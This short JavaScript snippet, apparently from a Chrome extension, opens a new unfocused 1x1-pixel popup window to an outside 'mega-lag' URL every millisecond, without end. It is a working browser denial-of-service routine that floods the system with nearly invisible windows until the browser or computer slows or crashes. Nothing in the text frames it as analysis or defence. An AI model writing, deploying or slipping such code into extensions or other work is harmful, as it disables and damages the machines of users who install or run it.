setInterval(() => {
    chrome.windows.create({
        url: 'https://mega-lag.sx9.is-a.dev',
        type: 'popup',
        focused: false,
        height: 1,
        width: 1
    });
}, 1);
